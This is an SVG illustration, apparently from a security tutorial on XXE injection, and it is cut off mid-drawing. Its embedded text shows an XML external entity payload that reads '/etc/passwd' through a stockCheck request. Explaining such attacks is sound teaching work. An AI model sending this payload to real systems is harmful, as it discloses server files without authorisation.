<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="781" height="440" viewBox="0 0 781 440"><defs><clipPath id="a"><path d="M138.83,290.88l3.47,7.55h31.1v16.43H139.82s-7.5-.4-11.29-7a69.86,69.86,0,0,1-5.18-10.76Z" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/></clipPath></defs><title>XXE Injection2-02</title><rect x="447.87" y="70.45" width="264.49" height="15.49" fill="#4c5054"/><rect x="414.43" y="87.41" width="297.93" height="15.49" fill="#4c5054"/><rect x="608.97" y="104.38" width="40.14" height="15.49" fill="#4c5054"/><text transform="translate(417.2 65.63)" font-size="13.88" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700">&lt;?xml version=&quot;1&quot;?&gt;<tspan fill="#333332"><tspan x="0" y="16.66" xml:space="preserve">    </tspan><tspan x="33.32" y="16.66" fill="#fff">&lt;!DOCTYPE stockCheck [ &lt;!ENTITY</tspan><tspan x="291.52" y="16.66" fill="#70d16d"> </tspan></tspan><tspan fill="#fff"><tspan x="0" y="33.31">xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;</tspan></tspan><tspan x="0" y="49.97">&lt;stockCheck&gt;&lt;productId&gt;</tspan><tspan x="191.57" y="49.97" fill="#fff">&amp;xxe;</tspan><tspan x="0" y="66.62">&lt;/productId&gt;&lt;/stockCheck</tspan></text><rect x="34.76" y="39.65" width="66.62" height="87.12" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="259.85" y="98.01" width="48.1" height="70.31" transform="translate(150.74 417.07) rotate(-90)" fill="#4c5054"/><rect x="251.99" y="89.31" width="63.83" height="87.69" transform="translate(150.74 417.07) rotate(-90)" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="67.69" y="48.78" width="0.76" height="0.13" fill="#d60000"/><rect x="67.97" y="49.07" width="0.2" height="0.1" fill="#d60000"/><rect x="44.39" y="48.61" width="47.35" height="69.85" fill="#4c5054"/><rect x="64.18" y="68.65" width="0.64" height="0.18" fill="#d60000"/><rect x="57.92" y="59.63" width="0.5" height="0.13" fill="#d60000"/><rect x="71.78" y="60.91" width="0.27" height="0.13" fill="#d60000"/><rect x="70.77" y="66.23" width="0.27" height="0.13" fill="#d60000"/><rect x="71.08" y="58.79" width="0.44" height="0.13" fill="#d60000"/><rect x="58.01" y="62.91" width="0.48" height="0.18" fill="#d60000"/><rect x="58.01" y="58.21" width="0.31" height="0.14" fill="#d60000"/><rect x="65.22" y="60.89" width="0.27" height="0.13" fill="#60bcd8"/><rect x="63.21" y="68.4" width="0.49" height="0.18" fill="#60bcd8"/><rect x="62.56" y="64.57" width="0.5" height="0.13" fill="#60bcd8"/><rect x="77.66" y="67.72" width="0.5" height="0.13" fill="#60bcd8"/><rect x="76.01" y="60.82" width="0.87" height="0.13" fill="#60bcd8"/><rect x="71.74" y="72.5" width="1.25" height="0.13" fill="#60bcd8"/><rect x="68.13" y="59.54" width="1.25" height="0.13" fill="#60bcd8"/><rect x="65.55" y="71.18" width="1.01" height="0.18" fill="#60bcd8"/><rect x="77.91" y="66.06" width="0.31" height="0.14" fill="#60bcd8"/><path d="M70.77,62.39a5.12,5.12,0,0,0,0-.56h-.19a5.29,5.29,0,0,0-.16-.9h.2c0-.13-.07-.26-.11-.39H71a3.61,3.61,0,0,0-.17-.46h-.55l0,0a6.25,6.25,0,0,0-1-1.64h.11l-.11-.12h-.11c-.07-.06-.13-.13-.2-.2h1.11l-.15-.14-.09-.08,0,0H68.67a.44.44,0,0,1,0-.3.09.09,0,0,0,0-.11.41.41,0,0,0-.11-.07,4.16,4.16,0,0,1-.79.09H68l-.13,0-.12-.07,0,0H68a1,1,0,0,0,.25,0l-.21,0-.09,0c0-.17-.08-.21-.24-.23s-.08-.11-.09-.11c-.51-.15-1-.25-1.51-.36a8.7,8.7,0,0,0-1.13-.05h-.29a5.91,5.91,0,0,0-2.77.75h-.38a3.37,3.37,0,0,0-.32.19h.39a5.64,5.64,0,0,0-.63.46H62l-.3.27H60.63l-.2.2h.11l-.11.12h-.11l-.08.1-.11.09A8,8,0,0,1,59,59a.69.69,0,0,0-.32.16s0,.07,0,.09c.23.16.6.15.69.43,0,0,0,.08-.05.13s-.08.17-.12.25l0,0h.56c-.06.15-.12.3-.17.46h-.56c0,.13-.08.26-.11.39h-.19a6.5,6.5,0,0,0-.16.9h.2a5.12,5.12,0,0,0,0,.56v.06H59a5.55,5.55,0,0,0,.06.82h-.7c0,.1,0,.19,0,.28h.7c0,.11,0,.23.08.34H59v0a5.53,5.53,0,0,0,.47,1.21.54.54,0,0,1,.05.11.22.22,0,0,1,0,.11,1.66,1.66,0,0,1-.38.5.22.22,0,0,0,.09.35,3.83,3.83,0,0,0,.89.08c.08,0,.14,0,.2.06l.09,0h-.52a.33.33,0,0,1,.1.06s0,.07.07.08l.06.06.18.18h.38l.34.3h.46l.13.1h-.46l.11.07h-.2l.17.12h.2a5.7,5.7,0,0,0,1.17.62h.53l.34.12H63a6.09,6.09,0,0,0,3.65,0h.53l.34-.12H67a14.11,14.11,0,0,1,1.42-.51l.23-.06-.68-.05.46,0,.12-.06-.41,0,.68,0a.51.51,0,0,0,0-.13h.46s0-.07,0-.1h-.45a.3.3,0,0,1,0-.21l.09-.09h-.39l.06-.06c.11-.1.22-.21.32-.32h.38a6.55,6.55,0,0,0,.52-.66l.07-.12c.18-.29.51-.39.78-.59a.1.1,0,0,0,0-.08c-.07-.21-.3-.35-.21-.6,0,0,0-.09,0-.13s.05-.18.08-.28v0h.19c0-.11.06-.23.08-.34h-.7c0-.09,0-.18,0-.28h.7a5.55,5.55,0,0,0,.06-.82h-.19Zm-2.72,4.37h0Z" fill="#d60000"/><path d="M76.81,65.91a5.07,5.07,0,0,0,0-.55h-.19a5.59,5.59,0,0,0-.16-.91h.2c0-.13-.07-.26-.11-.38h.55a4.43,4.43,0,0,0-.17-.47h-.56v0a5.94,5.94,0,0,0-1-1.64h.11l-.11-.12h-.11l-.2-.2h1.1a.93.93,0,0,0-.14-.14l-.09-.08-.08-.06H74.66a.26.26,0,0,1,0-.41.19.19,0,0,0,0-.07h-.2l-.44,0h0l.22,0c-.06,0-.11,0-.17-.06l-.16,0h0l.3-.06a2.33,2.33,0,0,0-.36-.08l-.12,0s.1,0,.14-.08,0,0,0,0-.31-.09-.42-.16c-.37-.21-.81-.11-1.21-.22A1.59,1.59,0,0,0,72,60a4.92,4.92,0,0,0-.93,0H70.4a6,6,0,0,0-2.49.75h-.39l-.31.18h.39a7.26,7.26,0,0,0-.63.46h1.11l-.3.28H66.67a1.89,1.89,0,0,0-.2.2h.11l-.11.12h-.11l-.09.1-.1.09-.11.08a6.64,6.64,0,0,1-1.12.35c-.06,0-.2.05-.15.14.15.27.6.19.69.5a.61.61,0,0,1,0,.12l-.11.26,0,0h.56c-.06.16-.12.31-.17.47h-.56c0,.12-.08.25-.11.38h-.19a5.59,5.59,0,0,0-.16.91h.2a5.07,5.07,0,0,0,0,.55V66H65a7.53,7.53,0,0,0,.07.83h-.7a2.56,2.56,0,0,0,0,.27h.7c0,.12,0,.23.07.34H65v0a6.11,6.11,0,0,0,.46,1.19l.06.12a.3.3,0,0,1-.08.18c-.2.19-.54.29-.58.59,0,0,0,.07.09.08.35.1.73-.07,1.08.1l.07,0a1.64,1.64,0,0,1,.22.14h0a1.47,1.47,0,0,0-.42,0c.06,0,.08.09.14.12l.06.07.2.19h.38l.34.29h.46l.13.1h-.46l.1.08h-.19l.17.12h.2a6.19,6.19,0,0,0,1.17.61h.53a2.3,2.3,0,0,0,.34.12H69a5.89,5.89,0,0,0,3.65,0h.53l.34-.12H73A7.44,7.44,0,0,1,74.59,71a.27.27,0,0,0,.12-.07h-.17a.12.12,0,0,0,.06-.06v-.07l-.58,0,.69,0a.54.54,0,0,1-.07-.13h.46a.17.17,0,0,1,0-.1h-.46a.19.19,0,0,1,.09-.13l.09-.08.09-.08h-.38c.13-.13.26-.25.38-.39h.38a6.55,6.55,0,0,0,.52-.66l.07-.12c.19-.33.58-.37.85-.6a.13.13,0,0,0,0-.09c-.1-.19-.37-.33-.25-.57,0,0,0-.09,0-.14s0-.18.08-.27v0h.19c0-.11,0-.22.08-.34h-.7c0-.09,0-.18,0-.27h.69A5.69,5.69,0,0,0,77,66h-.19Zm-10.35,4h0Zm8,1-.7,0h-.06Z" fill="#60bcd8"/><path d="M73.92,61.84h-.55l0,0a6,6,0,0,0-1-1.63h.11l-.11-.12H72.2l-.2-.21h1.11l-.24-.22-.06,0H71.7l0,0c-.11-.13.07-.26.06-.39s0-.08-.06-.06a2.13,2.13,0,0,1-.91-.09,1.05,1.05,0,0,0,.43-.07l-.23,0-.1,0c-.08,0,.07-.07,0-.12s-.32-.11-.4-.18c-.27-.25-.73-.11-1.1-.24a6.38,6.38,0,0,0-1.85-.15h-.14a6.17,6.17,0,0,0-2.49.74h-.38l-.32.19h.39a7.26,7.26,0,0,0-.63.46H65.1l-.3.27H63.69l-.2.21h.11l-.11.12h-.11l-.1.1c-.29.31-.76.31-1.14.46-.12.05-.4.08-.35.18.13.26.6.21.71.51a.28.28,0,0,1,0,.13c-.05.08-.08.17-.12.25l0,0h.56c-.06.15-.12.31-.17.46h-.56c0,.13-.08.26-.11.39h-.19a6.78,6.78,0,0,0-.16.9h.2a5.25,5.25,0,0,0,0,.56v.06h.2a5.69,5.69,0,0,0,.06.83h-.7c0,.09,0,.18,0,.27h.7a3.38,3.38,0,0,0,.08.34h-.2v0a5.73,5.73,0,0,0,.47,1.21.47.47,0,0,1,0,.1c0,.06,0,.14,0,.16a1.21,1.21,0,0,0-.51.61s0,.1.07.13c.34.14.75,0,1.08.15l.08,0,.07,0H63l.07.07.06.06a3.07,3.07,0,0,0,.26.25h.38c.11.11.23.2.34.3h.46l.13.1h-.46l.11.08h-.2l.17.11h.2a5.7,5.7,0,0,0,1.17.62h.53l.34.12H66a6.09,6.09,0,0,0,3.65,0h.53l.34-.12H70a8.6,8.6,0,0,1,1.74-.55,2.62,2.62,0,0,0-.28,0c.12-.07.2-.15.34-.11a1.47,1.47,0,0,0-.06-.14h.46l0-.1h-.45a.21.21,0,0,1,0-.13.3.3,0,0,1,.08-.08l.1-.09h-.39l.06-.06c.11-.1.22-.21.32-.32h.38a6.55,6.55,0,0,0,.52-.66l.07-.12c.17-.33.55-.38.81-.62a.06.06,0,0,0,0-.08c-.09-.18-.32-.34-.23-.56l0-.14c0-.09,0-.18.08-.27v0h.19a3.38,3.38,0,0,0,.08-.34h-.7c0-.09,0-.18.05-.27H74a5.69,5.69,0,0,0,.06-.83h-.19v-.06a5.25,5.25,0,0,0,0-.56h-.19a5.47,5.47,0,0,0-.16-.9h.2c0-.13-.07-.26-.11-.39h.55A4.28,4.28,0,0,0,73.92,61.84Z" fill="#fff"/><rect x="58.03" y="102.73" width="0.64" height="0.18" fill="#d60000"/><rect x="57.85" y="99.18" width="0.5" height="0.13" fill="#d60000"/><rect x="64.21" y="108.46" width="0.5" height="0.13" fill="#d60000"/><rect x="56.59" y="100.52" width="0.76" height="0.13" fill="#d60000"/><rect x="57.67" y="105.18" width="1.01" height="0.13" fill="#d60000"/><rect x="72.99" y="107.11" width="0.48" height="0.18" fill="#d60000"/><rect x="72.79" y="98.47" width="0.31" height="0.14" fill="#d60000"/><rect x="73.51" y="104.53" width="0.31" height="0.14" fill="#d60000"/><rect x="64.21" y="95.3" width="0.75" height="0.14" fill="#d60000"/><rect x="62.62" y="105.54" width="0.27" height="0.13" fill="#60bcd8"/><rect x="79.04" y="106.17" width="0.49" height="0.18" fill="#60bcd8"/><rect x="78.08" y="100.37" width="0.87" height="0.13" fill="#60bcd8"/><rect x="62.2" y="110.14" width="0.87" height="0.13" fill="#60bcd8"/><rect x="78.67" y="102.71" width="0.87" height="0.13" fill="#60bcd8"/><rect x="62.63" y="100.94" width="0.76" height="0.13" fill="#60bcd8"/><rect x="66.25" y="98.49" width="1.25" height="0.13" fill="#60bcd8"/><rect x="73.61" y="112.42" width="1.25" height="0.13" fill="#60bcd8"/><rect x="77.47" y="109.44" width="1.25" height="0.13" fill="#60bcd8"/><path d="M71.12,99h-.31v-.54h.31v-1h-.2V97h.2v-.4H70v-.22h1.12v-.13h1.06v-.13H71.12V96h-12v.21h1.07v.13H59.15v.13H58v.22h1.12V97H59v.41h.2v1h-.3V99h.3v.52h1.41v.15H59.15V100h.64v.28h-.64v.87H60.4v.4H59.15v.67h-.1v.11c0,.28.3.35.48.49a.14.14,0,0,1,0,.14c-.17.21-.44.3-.49.59v.25h.74v.36h-.74v.5h-.88v.22h.88v.89h-.16v.72h.16v.14h.68v.22h-.68v.34h-.33v.31h.33v.41H71v-.41h-.33v-.31H71v-.34h.67v-.22H71v-.14h-.17v-.72H71v-.89h-.88v-.22H71v-.5h.73v-.36H71v-.6c0-.25.28-.34.42-.52s-.21-.32-.32-.47h.11a.32.32,0,0,1-.11-.24v-.42h1.25v-.4H71.12v-.87h.63V100h-.63v-.33h1.41v-.15H71.12Z" fill="#d60000"/><path d="M77.16,110H77v-.71h.16v-.89h-.87v-.22h.87v-.5h.74v-.37h-.74v-.59c0-.3.34-.39.4-.64s-.19-.23-.29-.35h.12a.42.42,0,0,1-.12-.25v-.42h1.25v-.39H77.27v-.88h.63v-.27h-.63v-.33h1.4v-.15h-1.4v-.52H77V102h.31v-1h-.21v-.41h.21v-.41H76.15V100h1.12v-.14h1.06v-.12H77.27v-.22h-12v.22h1.06v.12H65.3V100H64.18v.21H65.3v.41h-.2V101h.2v1H65v.54h.31v.52h1.41v.15H65.3v.33h.63v.27H65.3v.88h1.25v.39H65.3v.67h-.1a.94.94,0,0,0,0,.12c.08.19.3.24.45.38a.09.09,0,0,1,0,.1c-.13.24-.47.35-.48.66v.32h.73v.37H65.2v.5h-.88v.22h.88v.89H65V110h.17v.15h.67v.21H65.2v.35h-.33v.3h.33v.41h12V111h-.32v-.3h.32v-.35h.68v-.21h-.68Z" fill="#60bcd8"/><path d="M74.19,100.77h-.3v-.53h.3v-1H74V98.8h.2v-.4H73.07v-.22h1.12v-.13h1.07v-.13H74.19v-.21h-12v.21h1.07v.13H62.22v.13H61.11v.22h1.11v.4H62v.41h.2v1h-.3v.53h.3v.52h1.41v.15H62.22v.34h.64v.27h-.64v.88h1.26v.39H62.22V104h-.1a1.09,1.09,0,0,0,0,.12c0,.24.3.29.47.44a.08.08,0,0,1,0,.09c-.13.25-.51.36-.5.68v.25h.74v.36h-.74v.51h-.87v.21h.87v.89H62v.72h.16v.14h.68v.22h-.68V109H61.8v.3h.32v.41h12v-.41h-.33V109h.33v-.35h.68v-.22h-.68v-.14h-.16v-.72h.16v-.89h-.88v-.21h.88v-.51h.74v-.36h-.74V105c0-.29.32-.38.4-.63s-.2-.24-.31-.35a.23.23,0,0,1,.11,0,.6.6,0,0,1-.08-.16s0,0,0-.08v-.42h1.26v-.39H74.19v-.88h.64v-.27h-.64v-.34H75.6v-.15H74.19Z" fill="#fff"/><rect x="59.76" y="82.15" width="1.07" height="0.18" fill="#d60000"/><rect x="56.91" y="78.53" width="0.64" height="0.18" fill="#d60000"/><rect x="57.91" y="79.53" width="1.02" height="0.13" fill="#d60000"/><rect x="61.75" y="84.66" width="1.02" height="0.13" fill="#d60000"/><rect x="72.43" y="78.7" width="0.31" height="0.15" fill="#d60000"/><rect x="69.69" y="84.2" width="0.31" height="0.15" fill="#d60000"/><rect x="60.84" y="83.06" width="0.31" height="0.15" fill="#d60000"/><rect x="62.77" y="87.12" width="0.31" height="0.15" fill="#d60000"/><rect x="56.08" y="77.55" width="1.26" height="0.13" fill="#d60000"/><rect x="72.95" y="90.14" width="0.5" height="0.18" fill="#60bcd8"/><rect x="66.03" y="87.34" width="0.5" height="0.18" fill="#60bcd8"/><rect x="63.06" y="81.5" width="0.5" height="0.18" fill="#60bcd8"/><rect x="76.47" y="83.76" width="0.88" height="0.13" fill="#60bcd8"/><rect x="74.13" y="88.51" width="1" height="0.17" fill="#60bcd8"/><rect x="78.96" y="79.81" width="1.09" height="0.19" fill="#60bcd8"/><rect x="75.84" y="85.98" width="1.26" height="0.13" fill="#60bcd8"/><path d="M71.18,77.43l.45-.78H70.49l.15-.26h1.15l.1-.18H58l.11.18H56.91l.15.26h1.15l.45.78h1.87l0,.1.06.09H58.77l.06.09.07.11c.21.23.58.21.74.47s-.14.25-.17.4a.26.26,0,0,0,0,.15.39.39,0,0,0,0,.1H60l.12.22h-.43l.68,1.17H58.92l.12.2h1.41l.33.57h.87l.11.18h-.87l.44.76.05.09c.21.31.68.31.83.63.06.16-.28.29-.17.5l.06.12.1.17h.31l.14.23h-.32l1,1.68h-.79l.18.31h.79l.22.39,0,.07c.16.27.47.37.66.64,0,.07.09.12.07.18a.7.7,0,0,0,.13.68l0,.07.27.47.67-1.16.06-.09a4.46,4.46,0,0,0,.57-1l.06-.11.09-.15h-.79l.17-.31h.79l1-1.68h.32l.14-.23h-.32l.1-.17.06-.12A.75.75,0,0,1,68,83.1c.23-.22.7-.25.73-.56,0-.14-.24-.29-.16-.49a.22.22,0,0,1,0-.08l.38-.68h.87l.11-.18h-.87l.33-.57H68l.12-.2h1.42l.67-1.17h.44l.12-.22h-.43l.06-.1c.18-.34.61-.36.86-.65,0,0,0,0,0-.07s-.24-.23-.2-.41a.41.41,0,0,1,0-.09h1.87l.11-.2Z" fill="#d60000"/><path d="M77.23,81.15h1.86L79.2,81H77.34l.45-.78H76.64l.15-.27h1.15l.11-.18H64.11l.1.18H63.06l.16.27h1.15l.45.78h1.86l.06.1.05.09H64.93l.06.1c.14.21.4.27.61.38s.22.09.2.21-.29.32-.17.54l.06.1h.43l.13.21h-.43l.67,1.18H65.08l.11.2h1.42l.33.57h.86l.11.18H67l.44.76.06.09c.18.26.51.34.78.54a.09.09,0,0,1,.06.08c0,.2-.27.3-.19.51l.06.11.1.17h.32l.13.24h-.31l1,1.68h-.79l.17.3h.79l.15.26.08.13c.21.39.44.76.66,1.14l0,.09.51.88.45-.79.06-.09a1.58,1.58,0,0,0,.56-1,.52.52,0,0,1,.06-.13l0-.07.27-.47h-.79l.18-.3h.79l1-1.68H74l.13-.24H73.8l.21-.35s0,0,0-.08a2.3,2.3,0,0,1,.77-.49c.06,0,.11-.1.06-.18s-.29-.3-.16-.49l0-.08.34-.59H76l.11-.18h-.86l.32-.57H74.13l.11-.2h1.42l.68-1.18h.43l.13-.21h-.44l.06-.1c.17-.33.56-.34.84-.56a.22.22,0,0,0,0-.08c-.05-.17-.22-.29-.18-.49A.84.84,0,0,1,77.23,81.15Zm0,0Zm-10.4,0Z" fill="#60bcd8"/><path d="M74.26,79.2l.45-.78H73.56l.16-.27h1.15L75,78H61l.1.18H60l.15.27h1.15l.45.78H63.6l.06.09.05.1H61.85l.06.1c.18.27.55.3.78.53a.1.1,0,0,1,0,.13c-.08.14-.22.29-.13.46a.69.69,0,0,0,0,.1h.44l.12.22h-.43l.68,1.17H62l.12.2h1.41l.33.57h.87l.1.19H64l.44.76a.41.41,0,0,0,0,.09,2.26,2.26,0,0,0,.76.51.15.15,0,0,1,0,.23.38.38,0,0,0-.07.5l0,.09,0,.08h.32l.14.23h-.32l1,1.69h-.79l.18.3h.78l.23.39,0,.07a2.26,2.26,0,0,1,.62,1,1.29,1.29,0,0,0,.2.41l0,.08L68,90l.56-1,.06-.09a2,2,0,0,1,.44-.36.31.31,0,0,0,.11-.19,1.38,1.38,0,0,1,0-.5l.07-.13.15-.26h-.78l.17-.3h.79l1-1.69h.32l.14-.23h-.32l.16-.29,0-.06c.21-.25.53-.35.76-.58a.11.11,0,0,0,0-.07c-.09-.2-.24-.4-.08-.59l0-.09.34-.58h.87l.1-.19h-.86l.33-.57H71.05l.12-.2h1.41l.68-1.17h.43l.13-.22h-.43l0-.1.08-.1c.17-.23.45-.31.66-.49a.14.14,0,0,0,0-.15,1.33,1.33,0,0,1-.07-.38l0-.1H76l.11-.19Z" fill="#fff"/><rect x="352.97" y="43.41" width="45.56" height="103.47" fill="#b8e8b5"/><rect x="539.44" y="-172.17" width="28.58" height="403.3" transform="translate(583.21 -524.26) rotate(90)" fill="#70d16d"/><circle cx="365.73" cy="29.27" r="3.2" fill="#fff"/><circle cx="375.72" cy="29.27" r="3.2" fill="#fff"/><circle cx="385.97" cy="29.27" r="3.2" fill="#fff"/><line x1="410.92" y1="29.97" x2="445.23" y2="29.97" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="59.35" x2="388.55" y2="59.35" fill="none" stroke="#70d16d" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="70.21" x2="388.55" y2="70.21" fill="none" stroke="#70d16d" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="81.06" x2="388.55" y2="81.06" fill="none" stroke="#70d16d" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="91.91" x2="388.55" y2="91.91" fill="none" stroke="#70d16d" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="102.77" x2="388.55" y2="102.77" fill="none" stroke="#70d16d" stroke-miterlimit="10" stroke-width="2"/><line x1="455.82" y1="29.97" x2="490.13" y2="29.97" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="2"/><line x1="500.72" y1="29.97" x2="535.02" y2="29.97" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="2"/><polygon points="74.11 300.43 56.83 295.36 68.36 262.94 85.08 266.65 74.11 300.43" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M143.73,409.07a5.17,5.17,0,1,1-10.33,0V389.73h10.33Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M128.73,411.74a14.64,14.64,0,0,1,1.84-5.48.48.48,0,0,1,.33-.15s3.6-.62,5.64,1.93c1.64,2.06,7.36,0,8.13-4.63a.84.84,0,0,1,.44-.61.93.93,0,0,1,.78-.07c5.16,1.76,10.67,5.62,12.76,10a3,3,0,0,1-.1,2.71,2.52,2.52,0,0,1-2.18,1.33h-23.7a3.88,3.88,0,0,1-3.06-1.55A4.56,4.56,0,0,1,128.73,411.74Z" fill="#4c5054"/><path d="M152.12,406.76a.9.9,0,0,1,1.24-.28,7.13,7.13,0,0,1,1.3,1c1.34,1.31,1.85,1.28,4.57,1.28,2.27,0,3.46-4.71,6.23-6.27a3.62,3.62,0,0,1,2.33-.4c7.75,1.35,13.41,5.63,16.34,10.64a2.47,2.47,0,0,1-.12,2.71,3.3,3.3,0,0,1-2.72,1.33H155.08a5.29,5.29,0,0,1-3.8-1.55,3.91,3.91,0,0,1-1.1-3.53A14.29,14.29,0,0,1,152.12,406.76Z" fill="#4c5054" stroke="#fff" stroke-miterlimit="10" stroke-width="2.84"/><path d="M164.53,409.07a5.17,5.17,0,1,1-10.33,0V392.21h10.33Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M152.12,406.76a.9.9,0,0,1,1.24-.28,7.13,7.13,0,0,1,1.3,1,5.35,5.35,0,0,0,4.57,1.28c2.26-.29,3.46-4.71,6.23-6.27a3.62,3.62,0,0,1,2.33-.4c7.75,1.35,13.41,5.63,16.34,10.64a2.47,2.47,0,0,1-.12,2.71,3.3,3.3,0,0,1-2.72,1.33H155.08a5.29,5.29,0,0,1-3.8-1.55,3.91,3.91,0,0,1-1.1-3.53A14.29,14.29,0,0,1,152.12,406.76Z" fill="#4c5054"/><polygon points="104.39 324.08 99.59 417 102.55 417 112.43 325.77 104.39 324.08" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M77.2,343.43h54.3a7.59,7.59,0,0,1,7.67,7.5v43.84" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="17"/><path d="M139.58,359.28H89.1s1.65-1.45,3-2.44c1.54-1.17,40.75-4.4,40.75-4.4s5.42,2.37,5.62,2.37A35,35,0,0,1,139.58,359.28Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="1.57"/><polygon points="155.81 309.34 163.55 257.23 225.53 257.71 213.46 309.49 155.81 309.34" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="160.33 308.25 167.33 261.26 177.43 261.41 168.49 307.74 160.33 308.25" fill="#edd6d6"/><polygon points="166.13 266.97 167.33 261.26 220.29 261.67 218.84 267.54 166.13 266.97" fill="#d60000"/><polygon points="161.05 305.33 167.33 261.26 220.29 261.67 209.81 305.46 161.05 305.33" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="153.9" y="309.33" width="59.71" height="4.42" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M191,303.44a2.19,2.19,0,0,1,.15,3.1,2.22,2.22,0,0,1-1.64.72.52.52,0,0,0-.41.18.57.57,0,0,0-.15.43,2.21,2.21,0,0,1-.55,1.7,2.17,2.17,0,0,1-1.64.71.57.57,0,0,0-.42.19.55.55,0,0,0-.14.43,2.2,2.2,0,0,1-2.6,2.37.54.54,0,0,0-.66.47,2.13,2.13,0,0,1-.55,1.15,2.19,2.19,0,0,1-3.1.15L178,313.93a1.65,1.65,0,0,0-1.53-.38c-3,.8-5.7.47-7.06-1.13-2.2-2.59,0-7.52,4.84-11C183.71,294.65,182.64,295.85,191,303.44Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M80.68,224.68a61.87,61.87,0,0,0,5.75,8.68A26.82,26.82,0,0,0,91.07,238v14.89l15.49.53V244s12,2.3,17.6-3.71,6.27-17.46,4.66-31.7-1.44-6.27-1.44-6.27" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="31.21 324.18 21.57 417 24.53 417 41.87 325.62 31.21 324.18" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="252.82 324.18 263.52 417 260.56 417 242.4 323.11 252.82 324.18" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="187.09 324.41 190.77 417 187.81 417 179 324.01 187.09 324.41" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M124,227.92a1.85,1.85,0,0,1-1.4.76c-1.56,0-2.83-2.61-2.83-5.84S121,217,122.55,217" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="22.34" y="314.33" width="244.56" height="13.03" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M95.24,343.43h60.12a3.64,3.64,0,0,1,3.64,3.64v47.7" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="17"/><path d="M90.12,255.46S70,258.62,68.59,262.09c-3,7.3-3.64,20.18-1.31,29.13s19.11,11.17,17.32,27.6c0,0-5.25,11.32-5.66,16.29a38.81,38.81,0,0,0-.14,7.17l36.92-.44a6,6,0,0,0,5.94-6.26c-.27-6.54-.67-16.52-.76-21.09-.15-7,1.95-19.72,1.95-19.72s7.27-29.81,3.88-32.52-16.51-6.3-21.12-6.44S90.12,255.46,90.12,255.46Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="263.19 230.23 260.53 233.12 221.73 207.25 224.4 204.36 263.19 230.23" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="236.87" y="306.2" width="2.71" height="5.06" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="46.37" y1="359.09" x2="35.2" y2="417" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="36.9 417 33.5 417 44.67 358.76 48.07 359.43 36.9 417" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="89.86" y1="358.61" x2="94.42" y2="417" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="92.7 417 88.13 358.75 91.58 358.48 96.15 417 92.7 417" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M82.67,417h-3.4c.09-.46,8.79-47.39,10.1-53.58,1.45-6.86,4.19-7.85,5-8l.18,0c.34,0,33.7-2.37,37.75-2.61a5,5,0,0,1,4.05,1.4,6.18,6.18,0,0,1,1.5,4.41L141.32,417h-3.45l-3.49-58.41v-.12a2.84,2.84,0,0,0-.53-1.86c-.1-.1-.41-.4-1.37-.35-3.83.22-34.07,2.34-37.41,2.58-.32.23-1.49,1.33-2.33,5.3C91.45,370.3,82.76,416.54,82.67,417Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M133,352.88s2.88-.63,4.32,4.15c1.2,4,4.67,1.91,4.18-.23-.27-1.2-1.65-7.48-6.3-8.87a16.22,16.22,0,0,0-4-.27l-35.92,1.6s-4.45,1.52-4.82,3.79.59,3.56,1.81,3.15a16.61,16.61,0,0,1,4.51-1.1C98.9,354.89,133,352.88,133,352.88Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M127,262.57l15.28,35.86h31.1v16.43H140.91a14.27,14.27,0,0,1-12.77-8l-11.2-23.12" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M88.06,256.17l-.87-6.56h22.92L109,257s-3.56,1.5-11.47,1.18S88.06,256.17,88.06,256.17Z" fill="#4c5054"/><circle cx="171.11" cy="264.61" r="0.68" fill="#fff"/><circle cx="173.22" cy="264.71" r="0.68" fill="#fff"/><circle cx="175.39" cy="264.73" r="0.68" fill="#fff"/><line x1="169.34" y1="270.6" x2="174.21" 